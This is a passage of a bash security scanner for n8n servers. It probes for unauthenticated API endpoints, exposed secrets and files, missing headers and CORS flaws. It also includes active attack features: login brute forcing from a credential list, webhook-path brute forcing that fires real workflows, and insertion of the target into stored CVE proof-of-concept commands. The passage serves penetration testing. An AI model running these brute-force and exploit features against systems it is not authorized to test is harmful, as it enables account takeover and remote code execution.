    LDAP_ON=$(vget sso.ldap.loginEnabled "unknown")
    OIDC_ON=$(vget sso.oidc.loginEnabled "unknown")
    OIDC_LOGIN_URL=$(vget sso.oidc.loginUrl "")
    OIDC_CB_URL=$(vget sso.oidc.callbackUrl "")
    OAUTH1_CB=$(vget oauthCallbackUrls.oauth1 "")
    OAUTH2_CB=$(vget oauthCallbackUrls.oauth2 "")
    TELEMETRY_ON=$(vget telemetry.enabled "unknown")
    TELEMETRY_PROXY=$(vget telemetry.config.proxy "")
    AUTHCOOKIE_SECURE=$(vget authCookie.secure "unknown")
    HEALTH_STATUS=$(jget "$HEALTHZ_JSON" "status" "unreachable")
    # Only a genuine leak if the disclosed host differs from the host we
    # actually scanned — an OIDC/OAuth callback almost always points back
    # at the instance's own public domain, which isn't a disclosure at all.
    local TARGET_HOST
    TARGET_HOST=$(echo "$TARGET" | sed -E 's#^https?://##; s#/.*##' | tr '[:upper:]' '[:lower:]')
    local INTERNAL_HOST=""
    for u in "$OAUTH2_CB" "$OAUTH1_CB" "$OIDC_LOGIN_URL" "$OIDC_CB_URL"; do
        if [[ -n "$u" && "$u" != "null" ]]; then
            h=$(echo "$u" | sed -E 's#^https?://##; s#/.*##')
            hl=$(echo "$h" | tr '[:upper:]' '[:lower:]')
            # Guard against junk extractions (e.g. a relative/path-only
            # callback URL like "/rest/oauth2-credential/callback" with no
            # host component, which would otherwise sed down to ".").
            if [[ -n "$h" && "$hl" != "$TARGET_HOST" && "$h" =~ ^[A-Za-z0-9]([A-Za-z0-9._-]*[A-Za-z0-9])?$ && "$h" == *.* ]]; then
                INTERNAL_HOST="$h"; break
            fi
        fi
    done
    # -------------------------------------------------------------------
    # Access control: unauthenticated REST/API endpoint exposure
    # -------------------------------------------------------------------
    # path | label | severity-if-exposed
    local ENDPOINTS=(
        "/rest/workflows|Workflow definitions|CRIT"
        "/rest/credentials|Stored credentials list|CRIT"
        "/api/v1/workflows|Public API - workflows (no API key)|CRIT"
        "/rest/users|User list|HIGH"
        "/rest/executions|Execution history|HIGH"
        "/rest/active-workflows|Active workflow list|HIGH"
        "/rest/credentials/for-workflow|Credential names/types usable by workflows|HIGH"
        "/rest/variables|n8n Variables (often misused to store secrets)|HIGH"
        "/rest/external-secrets/providers|Connected external secret-manager config|MED"
        "/rest/source-control/preferences|Source control (git) settings — may leak internal repo URL|MED"
        "/rest/owner|Owner/setup info|MED"
        "/rest/orchestration/health|Queue-mode worker topology|LOW"
        "/rest/insights/summary|Execution analytics/volume|LOW"
        "/rest/tags|Workflow tags|LOW"
        "/rest/license|License/plan info|LOW"
        "/rest/community-packages|Installed community nodes|LOW"
        "/metrics|Prometheus metrics|MED"
    )
    local EXPOSED_BODIES=()   # "file|label"
    local ENDPOINT_RESULTS=() # "path|label|verdict|status"
    for entry in "${ENDPOINTS[@]}"; do
        IFS='|' read -r ep label sev <<< "$entry"
        local bodyfile="$TMPDIR/ep_$(echo "$ep" | tr '/?&=' '____').body"
        local status
        status=$($CURL -o "$bodyfile" -w '%{http_code}' "$TARGET$ep" 2>/dev/null)
        local body
        body=$(cat "$bodyfile" 2>/dev/null)
        local verdict="PROTECTED"
        if [[ "$status" == "401" || "$status" == "403" ]]; then
            verdict="PROTECTED"
        elif [[ "$status" == "404" ]]; then
            verdict="NOT-ENABLED"
        elif [[ "$status" == "200" ]]; then
            # Guard against SPA catch-all routes returning 200 with the
            # same index.html for literally any path.
            if diff -q "$bodyfile" "$ROOT_BODY_FILE" >/dev/null 2>&1; then
                verdict="NOT-ENABLED"
            elif echo "$body" | grep -qE '"code"[[:space:]]*:[[:space:]]*(401|403)'; then
                verdict="PROTECTED"
            elif [[ -z "$body" ]] || [[ "$(is_empty_body "$bodyfile")" == "yes" ]]; then
                verdict="EMPTY"
            else
                verdict="EXPOSED"
                EXPOSED_BODIES+=("$bodyfile|$label")
            fi
        else
            verdict="OTHER($status)"
        fi
        ENDPOINT_RESULTS+=("$ep|$label|$verdict|$status")
        if [[ "$verdict" == "EXPOSED" ]]; then
            FINDINGS+=("$sev|access-control|Unauthenticated access to $ep ($label) — HTTP $status returned real data with no auth required")
        fi
    done
    # -------------------------------------------------------------------
    # HTTP method tampering — some reverse-proxy/framework configs only
    # enforce auth on GET, letting HEAD (sometimes OPTIONS) reach the real
    # handler on a path that just showed up PROTECTED. Cheap follow-up
    # since we already know which paths came back 401/403 on GET.
    # -------------------------------------------------------------------
    for entry in "${ENDPOINT_RESULTS[@]}"; do
        IFS='|' read -r ep label verdict status <<< "$entry"
        [[ "$verdict" == "PROTECTED" ]] || continue
        local head_status
        head_status=$($CURL -o /dev/null -w '%{http_code}' -I "$TARGET$ep" 2>/dev/null)
        if [[ "$head_status" == "200" ]]; then
            FINDINGS+=("HIGH|access-control|HTTP method tampering — $ep ($label) is PROTECTED via GET (401/403) but returns HTTP 200 via HEAD, suggesting auth is enforced per-verb rather than per-path")
        fi
    done
    # -------------------------------------------------------------------
    # Secret scan across everything that came back exposed (plus settings)
    # -------------------------------------------------------------------
    echo "$SETTINGS_JSON" > "$TMPDIR/settings.body"
    local SECRET_HITS=()
    if [[ "$HAVE_PY" == true ]]; then
        for pair in "${EXPOSED_BODIES[@]}" "$TMPDIR/settings.body|/rest/settings"; do
            IFS='|' read -r f lbl <<< "$pair"
            [[ -f "$f" ]] || continue
            while IFS= read -r line; do
                [[ -n "$line" ]] && SECRET_HITS+=("$line")
            done < <(secret_scan_file "$f" "$lbl")
        done
    fi
    for hit in "${SECRET_HITS[@]}"; do
        IFS='|' read -r stype slabel sval <<< "$hit"
        FINDINGS+=("CRIT|secret|Hardcoded secret found — $stype in $slabel: $sval")
    done
    # -------------------------------------------------------------------
    # Security headers
    # -------------------------------------------------------------------
    local HAS_HSTS=false HAS_XFO=false HAS_XCTO=false HAS_CSP=false
    # These must look only at the FINAL hop's headers (ROOT_HEADERS_FINAL):
    # scanning the full multi-hop blob (ROOT_HEADERS) would let a header
    # present only on an intermediate redirect (e.g. a CDN/proxy hop)
    # register as if the origin itself sent it.
    echo "$ROOT_HEADERS_FINAL" | grep -qi '^strict-transport-security:' && HAS_HSTS=true
    echo "$ROOT_HEADERS_FINAL" | grep -qi '^x-frame-options:' && HAS_XFO=true
    echo "$ROOT_HEADERS_FINAL" | grep -qi '^x-content-type-options:' && HAS_XCTO=true
    echo "$ROOT_HEADERS_FINAL" | grep -qi '^content-security-policy:' && HAS_CSP=true
    local IS_HTTPS=false
    [[ "$TARGET" == https://* ]] && IS_HTTPS=true
    # If we followed a redirect (e.g. Cloudflare forcing HTTPS) the
    # headers/body above already reflect the final scheme even though
    # $TARGET may still read "http://" — check the headers we actually
    # got back for a Location: https:// hop, or the effective final
    # status line, so the TLS finding doesn't misreport a host that in
    # fact only serves HTTPS. This deliberately scans every hop
    # (ROOT_HEADERS, not ROOT_HEADERS_FINAL) since the redirect-to-https
    # itself is what we're looking for.
    if [[ "$IS_HTTPS" == false ]] && echo "$ROOT_HEADERS" | grep -qi '^location: https://'; then
        IS_HTTPS=true
    fi
    if [[ "$IS_HTTPS" == false ]]; then
        FINDINGS+=("MED|tls|Service reachable over plain HTTP (no TLS) at $TARGET")
    elif [[ "$HAS_HSTS" == false ]]; then
        FINDINGS+=("LOW|header|HSTS header missing over HTTPS")
    fi
    [[ "$HAS_XFO" == false ]] && FINDINGS+=("LOW|header|X-Frame-Options header missing (clickjacking hardening)")
    [[ "$HAS_XCTO" == false ]] && FINDINGS+=("LOW|header|X-Content-Type-Options header missing")
    [[ "$HAS_CSP" == false ]] && FINDINGS+=("LOW|header|Content-Security-Policy header missing")
    # -------------------------------------------------------------------
    # Header disclosure — the standard four checks above only look for
    # ABSENCE of specific headers. This looks for PRESENCE of headers that
    # leak internal info (e.g. "x-n8n-origin: new-vps" disclosing an
    # internal deployment/host label — a real hit observed on this
    # engagement's own target that the standard checks above never see).
    # -------------------------------------------------------------------
    local DISCLOSURE_HDRS=()
    while IFS= read -r hline; do
        hline="${hline%$'\r'}"
        [[ -z "$hline" ]] && continue
        if echo "$hline" | grep -qiE '^(x-n8n-[a-z-]+|x-powered-by|x-internal-[a-z-]+|x-real-ip|x-forwarded-[a-z-]+|x-runtime|x-served-by|x-backend|x-upstream)[[:space:]]*:'; then
            DISCLOSURE_HDRS+=("$hline")
        fi
    done < <(echo "$ROOT_HEADERS_FINAL" | sort -u)
    for h in "${DISCLOSURE_HDRS[@]}"; do
        FINDINGS+=("LOW|header|Response header discloses internal information: $h")
    done
    # -------------------------------------------------------------------
    # CORS check
    # -------------------------------------------------------------------
    local CORS_HEADERS ACAO ACAC
    CORS_HEADERS=$($CURL -D - -o /dev/null -H "Origin: https://n8ked-cors-probe.invalid" "$TARGET/rest/settings" 2>/dev/null)
    ACAO=$(echo "$CORS_HEADERS" | grep -i '^access-control-allow-origin:' | head -1 | cut -d' ' -f2- | tr -d '\r')
    ACAC=$(echo "$CORS_HEADERS" | grep -i '^access-control-allow-credentials:' | head -1 | cut -d' ' -f2- | tr -d '\r')
    local CORS_VERDICT="none"
    if [[ -n "$ACAO" ]]; then
        if [[ "$ACAO" == "https://n8ked-cors-probe.invalid" && "${ACAC,,}" == "true" ]]; then
            CORS_VERDICT="reflect-credentialed"
            FINDINGS+=("CRIT|cors|CORS reflects arbitrary Origin with Access-Control-Allow-Credentials: true — any website can make authenticated requests on a victim's behalf")
        elif [[ "$ACAO" == "https://n8ked-cors-probe.invalid" ]]; then
            CORS_VERDICT="reflect"
            FINDINGS+=("MED|cors|CORS reflects arbitrary Origin header (no credentials flag) — verify intent")
        elif [[ "$ACAO" == "*" ]]; then
            CORS_VERDICT="wildcard"
            FINDINGS+=("LOW|cors|CORS Access-Control-Allow-Origin: * (no credentials observed)")
        fi
    fi
    # -------------------------------------------------------------------
    # Common accidentally-exposed files
    # -------------------------------------------------------------------
    local EXPOSE_PATHS=(/.env /.git/config /.git/HEAD /package.json /docker-compose.yml /config.json)
    local EXPOSED_FILES=()
    for p in "${EXPOSE_PATHS[@]}"; do
        local bf="$TMPDIR/file_$(echo "$p" | tr '/.' '__').body"
        local st
        st=$($CURL -o "$bf" -w '%{http_code}' "$TARGET$p" 2>/dev/null)
        if [[ "$st" == "200" ]] && ! diff -q "$bf" "$ROOT_BODY_FILE" >/dev/null 2>&1 && [[ -s "$bf" ]]; then
            EXPOSED_FILES+=("$p")
            FINDINGS+=("MED|file-exposure|Possible file exposure at $p (HTTP 200, distinct content — verify manually)")
        fi
    done
    # -------------------------------------------------------------------
    # Existing checks: webhook-test, credential test, nuclei
    # -------------------------------------------------------------------
    if [[ "$WEBHOOK_LIVE" == true ]]; then
        FINDINGS+=("MED|webhook|Webhook test endpoint responded with HTTP $WEBHOOK_STATUS and distinct content (may expose triggerable automations without authentication)")
    fi
    if [[ "$WEBHOOK_PROD_LIVE" == true ]]; then
        FINDINGS+=("HIGH|webhook|Production webhook base (/webhook/) responded with HTTP $WEBHOOK_PROD_STATUS and distinct content — this is the persistent, always-on unauthenticated trigger surface (unlike /webhook-test/, which only lives while a workflow is open in the editor)")
    fi
    if [[ -n "$INTERNAL_HOST" ]]; then
        FINDINGS+=("LOW|disclosure|Internal/real hostname disclosed via OAuth/OIDC callback URL: $INTERNAL_HOST")
    fi
    if [[ "$MFA_ENFORCED" == "false" ]]; then
        FINDINGS+=("HIGH|mfa|MFA not enforced org-wide (enabled=$MFA_ENABLED, enforced=$MFA_ENFORCED)")
    elif [[ "$MFA_ENFORCED" != "true" ]]; then
        FINDINGS+=("LOW|mfa|MFA posture could not be determined — mfa.* fields absent from /rest/settings on this n8n release (verify manually, e.g. during credentialed testing)")
    fi
    if [[ "$SHOW_SETUP" != "false" ]]; then
        FINDINGS+=("HIGH|setup|Setup wizard may still be open (no owner account confirmed) — potential unauthenticated admin takeover")
    fi
    local CRED_RESULT=""
    if [[ -n "$TEST_CRED" ]]; then
        local CU="${TEST_CRED%%:*}" CP="${TEST_CRED#*:}"
        CRED_RESULT=$(n8n_try_login "$TARGET" "$CU" "$CP")
        if [[ "$CRED_RESULT" == "success" ]]; then
            FINDINGS+=("CRIT|credential-test|Supplied credentials ($CU) are VALID — full editor access obtained")
        fi
    fi
    # -------------------------------------------------------------------
    # --userpass credential brute force: try every "user:pass" line in the
    # file against /rest/login. Paced with --brute-delay (default 1s)
    # between attempts out of respect for the target and to avoid tripping
    # a real account lockout that could lock out the legitimate admin;
    # stops at the first valid hit unless --no-stop-on-success is given.
    # -------------------------------------------------------------------
    local BRUTE_TRIED=0 BRUTE_TOTAL=0
    local BRUTE_VALID=()
    if [[ -n "$USERPASS_FILE" ]]; then
        # Count using the EXACT same trim/skip rules as the loop below
        # (blank, trimmed-blank, '#'-prefixed, or no ':' are all skipped)
        # so the reported "tried/total" ratio reflects what was actually
        # attempted rather than a raw line count that includes comments.
        BRUTE_TOTAL=$(awk '
            { gsub(/^[ \t]+|[ \t]+$/, "") }
            $0 == "" { next }
            /^#/ { next }
            index($0, ":") == 0 { next }
            { n++ }
            END { print n+0 }
        ' "$USERPASS_FILE")
        echo "[n8ked] Brute forcing $TARGET/rest/login — $BRUTE_TOTAL pair(s) from $USERPASS_FILE, ${BRUTE_DELAY}s delay..." >&2
        while IFS= read -r pair; do
            pair="$(echo "$pair" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
            [[ -z "$pair" || "$pair" == \#* || "$pair" != *:* ]] && continue
            BRUTE_TRIED=$((BRUTE_TRIED + 1))
            local bu="${pair%%:*}" bp="${pair#*:}"
            local bres
            bres=$(n8n_try_login "$TARGET" "$bu" "$bp")
            if [[ "$bres" == "success" ]]; then
                BRUTE_VALID+=("$pair")
                FINDINGS+=("CRIT|credential-test|Brute force via --userpass found VALID credentials ($bu) — full editor access obtained")
                echo "[n8ked]   -> VALID: $bu" >&2
                [[ "$STOP_ON_SUCCESS" == true ]] && break
            fi
            sleep "$BRUTE_DELAY" 2>/dev/null
        done < "$USERPASS_FILE"
        echo "[n8ked] Brute force done: tried $BRUTE_TRIED/$BRUTE_TOTAL pair(s), ${#BRUTE_VALID[@]} valid." >&2
    fi
    # -------------------------------------------------------------------
    # --webhook-brute: n8n's RCE CVEs generally need EITHER valid creds OR
    # a reachable webhook to trigger a workflow. Unlike credentials,
    # webhook paths are often human-chosen (not random UUIDs), so
    # wordlist-style discovery is realistic here. Every non-NOT-REGISTERED
    # result below is a REAL invocation of that workflow, not passive
    # recon — this can send real emails, hit real third-party APIs, or run
    # arbitrary code if the workflow itself is the RCE vector. Off by
    # default; runs against every path in the wordlist rather than
    # stopping at the first hit, since the goal here is mapping the whole
    # attack surface, not just proving access.
    # -------------------------------------------------------------------
    local WEBHOOK_BRUTE_HITS=()   # "base|candidate|method|verdict|status"
    if [[ -n "$WEBHOOK_BRUTE_FILE" ]]; then
        local wh_bases=("webhook")
        [[ "$INCLUDE_TEST_WEBHOOKS" == true ]] && wh_bases+=("webhook-test")
        IFS=',' read -r -a wh_methods <<< "$WEBHOOK_METHODS"
        local wh_total wh_tried=0
        wh_total=$(grep -cve '^[[:space:]]*$' "$WEBHOOK_BRUTE_FILE" 2>/dev/null || echo 0)
        local wh_combo_count=$(( wh_total * ${#wh_methods[@]} * ${#wh_bases[@]} ))
        echo "[n8ked] WARNING: --webhook-brute sends REAL requests to each candidate path." >&2
        echo "[n8ked] A hit below is a LIVE trigger of that workflow, not passive recon —" >&2
        echo "[n8ked] confirm this is in scope before proceeding." >&2
        echo "[n8ked] Brute forcing webhook paths — $wh_total path(s) x ${#wh_methods[@]} method(s) x ${#wh_bases[@]} base(s) = $wh_combo_count request(s), ${WEBHOOK_DELAY}s delay..." >&2
        if [[ "$wh_combo_count" -gt 2000 ]]; then
            echo "[n8ked] NOTE: that's a large combo count — this will take a while and generate a lot of target traffic." >&2
        fi
        while IFS= read -r cand; do
            cand="$(echo "$cand" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//;s#^/##')"
            [[ -z "$cand" || "$cand" == \#* ]] && continue
            wh_tried=$((wh_tried + 1))
            for wh_base in "${wh_bases[@]}"; do
                for wh_method in "${wh_methods[@]}"; do
                    wh_method="$(echo "$wh_method" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')"
                    [[ -z "$wh_method" ]] && continue
                    local wh_result wh_verdict wh_status
                    wh_result=$(webhook_probe "$TARGET" "$wh_base" "$cand" "$wh_method" "$ROOT_BODY_FILE" "$TMPDIR/wh")
                    IFS='|' read -r wh_verdict wh_status <<< "$wh_result"
                    if [[ "$wh_verdict" != "NOT-REGISTERED" ]]; then
                        WEBHOOK_BRUTE_HITS+=("$wh_base|$cand|$wh_method|$wh_verdict|$wh_status")
                        echo "[n8ked]   -> $wh_verdict [$wh_status]: /$wh_base/$cand ($wh_method)" >&2
                        case "$wh_verdict" in
                            TRIGGERED)
                                FINDINGS+=("CRIT|webhook|Unauthenticated webhook triggered — /$wh_base/$cand ($wh_method) returned HTTP $wh_status; this is a live, real invocation of that workflow and satisfies the webhook precondition for n8n RCE-style CVEs")
                                ;;
                            ERROR)
                                FINDINGS+=("HIGH|webhook|Registered webhook found — /$wh_base/$cand ($wh_method) returned HTTP $wh_status (workflow errored on invocation, but the path/method is real and reachable)")
                                ;;
                            AUTH-REQUIRED)
                                FINDINGS+=("MED|webhook|Registered webhook found — /$wh_base/$cand ($wh_method) requires its own auth (HTTP $wh_status); path is confirmed to exist")
                                ;;
                            TIMEOUT)
                                FINDINGS+=("MED|webhook|Possible webhook trigger — /$wh_base/$cand ($wh_method) timed out without responding; the workflow may still be executing")
                                ;;
                            *)
                                FINDINGS+=("MED|webhook|Unexpected response from /$wh_base/$cand ($wh_method): HTTP $wh_status — review manually")
                                ;;
                        esac
                    fi
                    sleep "$WEBHOOK_DELAY" 2>/dev/null
                done
            done
        done < "$WEBHOOK_BRUTE_FILE"
        echo "[n8ked] Webhook brute force done: $wh_tried path(s) tried, ${#WEBHOOK_BRUTE_HITS[@]} hit(s)." >&2
    fi
    # -------------------------------------------------------------------
    # --check-lockout: fire a handful of bad-credential attempts and check
    # whether the server ever throttles (429) or otherwise deviates from a
    # flat 401. Off by default — this is active/noisy (extra auth-failure
    # log entries on the target) so it only runs when explicitly asked for.
    # -------------------------------------------------------------------
    local LOCKOUT_RESULT=""
    if [[ "$CHECK_LOCKOUT" == true ]]; then
        echo "[n8ked] Probing $TARGET/rest/login for rate-limiting/lockout (8 attempts)..." >&2
        local lockout_statuses=() li
        for li in 1 2 3 4 5 6 7 8; do
            local lstatus
            lstatus=$($CURL -o /dev/null -w '%{http_code}' -X POST "$TARGET/rest/login" \
                -H "Content-Type: application/json" \
                --data "{\"emailOrLdapLoginId\":\"n8ked-lockout-probe@example.invalid\",\"password\":\"wrong-$li\"}" 2>/dev/null)
            lockout_statuses+=("$lstatus")
            sleep 0.3
        done
        if printf '%s\n' "${lockout_statuses[@]}" | grep -q '^429$'; then
            LOCKOUT_RESULT="throttled"
        else
            LOCKOUT_RESULT="not-throttled"
            FINDINGS+=("MED|lockout|No rate-limiting/lockout observed on /rest/login after 8 rapid failed attempts (consistently HTTP ${lockout_statuses[0]:-401}) — brute-force risk")
        fi
    fi
    local NUCLEI_OUT=""
    if [[ "$RUN_NUCLEI" == true ]]; then
        if command -v nuclei >/dev/null 2>&1; then
            NUCLEI_OUT=$(nuclei -u "$TARGET" -tags n8n -silent -no-color 2>/dev/null)
        else
            NUCLEI_OUT="nuclei not installed — skipped"
        fi
    fi
    # Fold nuclei's CVE matches into the risk summary as ONE rolled-up
    # "Unpatched software" finding rather than one line per CVE — multiple
    # matchers on the same template (e.g. "CVE-2026-21858:status-2",
    # ":dsl-3", ":word-1") are the same underlying finding and get
    # collapsed first, then every distinct CVE found on this host is
    # merged into a single finding whose severity is the HIGHEST severity
    # among them (so one Critical CVE makes the whole line Critical even
    # if others matched Medium). The full per-template nuclei output is
    # still shown verbatim in its own report section for detail/evidence.
    local NUCLEI_RAN=false
    local -a CVE_IDS=()
    local -a CVE_SEVS=()
    if [[ "$RUN_NUCLEI" == true ]]; then
        NUCLEI_RAN=true
        if [[ -n "$NUCLEI_OUT" && "$NUCLEI_OUT" != "nuclei not installed"* ]]; then
            local -A NUCLEI_SEEN=()
            local WORST_SEV="" WORST_RANK=-1
            sev_rank() { case "$1" in CRIT) echo 4;; HIGH) echo 3;; MED) echo 2;; LOW) echo 1;; *) echo 0;; esac; }
            while IFS= read -r nline; do
                # Strip ANSI color codes and any stray \r — nuclei can emit
                # color even when not attached to a real TTY depending on
                # version/environment, which otherwise makes the ^\[ anchor
                # below silently fail to match and drops every CVE line.
                nline=$(printf '%s' "$nline" | sed -E 's/\x1b\[[0-9;]*[a-zA-Z]//g; s/\r$//')
                [[ -z "$nline" ]] && continue
                if [[ "$nline" =~ ^\[([^\]]+)\]\ \[([^\]]+)\]\ \[([^\]]+)\]\ (.*)$ ]]; then
                    local ntmpl="${BASH_REMATCH[1]}" nsev="${BASH_REMATCH[3]}"
                    local nbase="${ntmpl%%:*}"
                    local nmysev=""
                    case "${nsev,,}" in
                        critical) nmysev="CRIT" ;;
                        high)     nmysev="HIGH" ;;
                        medium)   nmysev="MED" ;;
                        low)      nmysev="LOW" ;;
                        *)        nmysev="" ;;  # info/unknown - detection only, not a vuln
                    esac
                    if [[ -n "$nmysev" && -z "${NUCLEI_SEEN[$nbase]:-}" ]]; then
                        NUCLEI_SEEN[$nbase]=1
                        if [[ "$nbase" =~ ^CVE-[0-9]{4}-[0-9]+ ]]; then
                            # Genuine CVE-tagged template — fold into the
                            # "known CVE(s)" rollup finding below.
                            CVE_IDS+=("$nbase")
                            CVE_SEVS+=("${nsev,,}")
                            local r; r=$(sev_rank "$nmysev")
                            if [[ "$r" -gt "$WORST_RANK" ]]; then
                                WORST_RANK="$r"
                                WORST_SEV="$nmysev"
                            fi
                        else
                            # Non-CVE template (misconfig/exposure checks like
                            # "n8n-config") — report on its own instead of
                            # being mislabeled as a "known CVE".
                            FINDINGS+=("$nmysev|nuclei|Nuclei detection — $nbase (${nsev,,}): $(echo "$nline" | sed -E 's/^\[[^]]+\]\ \[[^]]+\]\ \[[^]]+\]\ //')")
                        fi
                    fi
                fi
            done <<< "$NUCLEI_OUT"
            if [[ ${#CVE_IDS[@]} -gt 0 ]]; then
                local cve_list=""
                for i in "${!CVE_IDS[@]}"; do
                    [[ -n "$cve_list" ]] && cve_list+=", "
                    cve_list+="${CVE_IDS[$i]} (${CVE_SEVS[$i]})"
                done
                FINDINGS+=("$WORST_SEV|cve|Unpatched software — n8n $VERSION is affected by known CVE(s): $cve_list")
            fi
        fi
    fi
    # -------------------------------------------------------------------
    # --poc: known-CVE PoC lookup. Works standalone off the detected
    # version (so it's useful even without --nuclei / without nuclei
    # installed), and also cross-references any CVE IDs nuclei already
    # confirmed above so both paths land in the same report section.
    # -------------------------------------------------------------------
    local -a CVE_POC_ROWS=()      # indices into CVE_DB_* to report
    local -a CVE_POC_SOURCES=()   # parallel short tag: "nuclei" or "version"
    if [[ "$CVE_MODE" == true ]]; then
        local -A CVE_POC_SEEN=()
        local idx ncid cid
        # Nuclei-confirmed IDs are claimed FIRST — an active probe against
        # the live target outranks our own unconfirmed version-range guess,
        # so a CVE nuclei actually found is never mislabeled as merely
        # "version match" below.
        for ncid in "${CVE_IDS[@]}"; do
            [[ -z "$ncid" || -n "${CVE_POC_SEEN[$ncid]:-}" ]] && continue
            for idx in "${!CVE_DB_ID[@]}"; do
                if [[ "${CVE_DB_ID[$idx]}" == "$ncid" ]]; then
                    CVE_POC_SEEN[$ncid]=1
                    CVE_POC_ROWS+=("$idx")
                    CVE_POC_SOURCES+=("nuclei")
                    break
                fi
            done
        done
        cve_poc_lookup "$VERSION"
        for idx in "${CVE_POC_MATCH_IDX[@]}"; do
            cid="${CVE_DB_ID[$idx]}"
            if [[ -z "${CVE_POC_SEEN[$cid]:-}" ]]; then
                CVE_POC_SEEN[$cid]=1
                CVE_POC_ROWS+=("$idx")
                CVE_POC_SOURCES+=("version")
            fi
        done
        # A CVE nuclei confirmed already has its own "known CVE(s)" Risk
        # Summary line above; a version-only match (nuclei not run, or
        # nuclei found nothing for this ID) has no Risk Summary entry yet,
        # so add one here — clearly marked as unconfirmed.
        for idx in "${!CVE_POC_ROWS[@]}"; do
            local dbidx="${CVE_POC_ROWS[$idx]}" src="${CVE_POC_SOURCES[$idx]}"
            if [[ "$src" == "version" ]]; then
                local psev; psev=$(cvss_to_sev "${CVE_DB_CVSS[$dbidx]}")
                FINDINGS+=("$psev|cve|Possible unpatched software — n8n $VERSION falls in the known-vulnerable range for ${CVE_DB_ID[$dbidx]} (${CVE_DB_NAME[$dbidx]}) — not confirmed by an active probe; see CVE Proof-of-Concept section")
            fi
        done
    fi
    # -------------------------------------------------------------------
    # Output
    # -------------------------------------------------------------------
    # Exit-code bookkeeping has to happen unconditionally, BEFORE the JSON
    # branch's early `return` below — otherwise a --json run's exit code
    # is always 0/2 and never reflects a Critical/High finding, since the
    # pretty-print path below (the only other place this was computed)
    # never executes when JSON output is requested.
    local n_crit_ec=0 n_high_ec=0
    for f in "${FINDINGS[@]}"; do
        IFS='|' read -r sev _cat_ec _msg_ec <<< "$f"
        case "$sev" in
            CRIT) ((n_crit_ec++)) ;;
            HIGH) ((n_high_ec++)) ;;
        esac
    done
    if [[ $((n_crit_ec + n_high_ec)) -gt 0 ]]; then
        HAD_HIGH_OR_CRIT=true
    fi
    # -------------------------------------------------------------------
    # JSON / CSV output. Both are built from the same underlying data in
    # one python pass (correct escaping for quotes/commas/unicode in
    # targets or messages, rather than hand-rolled string interpolation).
    # JSON is always emitted as a single compact line per host — true
    # JSONL, safe to pipe into jq, a log shipper, or anything that reads
    # one line at a time — regardless of how many hosts are scanned.
    # -------------------------------------------------------------------
    if [[ "$JSON_OUT" == true || -n "$CSV_OUT_FILE" ]]; then
        printf '%s\n' "${FINDINGS[@]}" > "$TMPDIR/out_findings.txt"
        printf '%s\n' "${ENDPOINT_RESULTS[@]}" > "$TMPDIR/out_endpoints.txt"
        printf '%s\n' "${DISCLOSURE_HDRS[@]}" > "$TMPDIR/out_disclosure.txt"
        printf '%s\n' "${WEBHOOK_BRUTE_HITS[@]}" > "$TMPDIR/out_webhookhits.txt"
        printf '%s\n' "${BRUTE_VALID[@]}" > "$TMPDIR/out_brutevalid.txt"
        local -a CVE_POC_JSON_ROWS=()
        local jci jdbi jcmd
        for jci in "${!CVE_POC_ROWS[@]}"; do
            jdbi="${CVE_POC_ROWS[$jci]}"
            jcmd="${CVE_DB_CMD[$jdbi]//\{\{TARGET\}\}/$TARGET}"
            jcmd="${jcmd//$'\n'/$'\x1f'}"
            CVE_POC_JSON_ROWS+=("${CVE_DB_ID[$jdbi]}|${CVE_DB_NAME[$jdbi]}|${CVE_DB_CVSS[$jdbi]}|${CVE_DB_AUTH[$jdbi]}|${CVE_POC_SOURCES[$jci]}|${CVE_DB_NOTE[$jdbi]}|$jcmd")
        done
        printf '%s\n' "${CVE_POC_JSON_ROWS[@]}" > "$TMPDIR/out_cvepoc.txt"
        if [[ "$HAVE_PY" == true ]]; then
            N8KED_TARGET="$TARGET" \
            N8KED_VERSION="$VERSION" \
            N8KED_INSTANCE_ID="$INSTANCE_ID" \
            N8KED_AUTH_METHOD="$AUTH_METHOD" \
            N8KED_MFA_ENABLED="$MFA_ENABLED" \
            N8KED_MFA_ENFORCED="$MFA_ENFORCED" \
            N8KED_INTERNAL_HOST="$INTERNAL_HOST" \
            N8KED_WEBHOOK_LIVE="$WEBHOOK_LIVE" \
            N8KED_WEBHOOK_PROD_LIVE="$WEBHOOK_PROD_LIVE" \
            N8KED_CRED_TEST="$([ -n "$TEST_CRED" ] && echo "$CRED_RESULT" || echo "not run")" \
            N8KED_BRUTE_RAN="$([ -n "$USERPASS_FILE" ] && echo true || echo false)" \
            N8KED_BRUTE_TRIED="$BRUTE_TRIED" \
            N8KED_BRUTE_TOTAL="$BRUTE_TOTAL" \
            N8KED_LOCKOUT="$([ "$CHECK_LOCKOUT" == true ] && echo "$LOCKOUT_RESULT" || echo "not run")" \
            N8KED_WHBRUTE_RAN="$([ -n "$WEBHOOK_BRUTE_FILE" ] && echo true || echo false)" \
            N8KED_NUCLEI_RAN="$NUCLEI_RAN" \
            N8KED_CORS="$CORS_VERDICT" \
            N8KED_EMIT_JSON="$JSON_OUT" \
            N8KED_CSV_FILE="$CSV_OUT_FILE" \
            N8KED_FINDINGS_FILE="$TMPDIR/out_findings.txt" \
            N8KED_ENDPOINTS_FILE="$TMPDIR/out_endpoints.txt" \
            N8KED_DISCLOSURE_FILE="$TMPDIR/out_disclosure.txt" \
            N8KED_WHHITS_FILE="$TMPDIR/out_webhookhits.txt" \
            N8KED_BRUTEVALID_FILE="$TMPDIR/out_brutevalid.txt" \
            N8KED_CVEPOC_FILE="$TMPDIR/out_cvepoc.txt" \
            N8KED_CVE_MODE="$CVE_MODE" \
            python3 -c '
import csv, json, os

def read_lines(path):
    try:
        with open(path) as f:
            return [l.rstrip("\n") for l in f if l.strip()]
    except Exception:
        return []

def to_bool(s):
    return str(s).strip().lower() == "true"

env = os.environ.get

findings = []
for line in read_lines(env("N8KED_FINDINGS_FILE", "")):
    p = line.split("|", 2)
    findings.append({
        "severity": p[0] if len(p) > 0 else "",
        "category": p[1] if len(p) > 1 else "",
        "message": p[2] if len(p) > 2 else "",
    })

endpoints = []
for line in read_lines(env("N8KED_ENDPOINTS_FILE", "")):
    p = line.split("|")
    if len(p) >= 4:
        endpoints.append({"path": p[0], "label": p[1], "verdict": p[2], "status": p[3]})

webhook_hits = []
for line in read_lines(env("N8KED_WHHITS_FILE", "")):
    p = line.split("|")
    if len(p) >= 5:
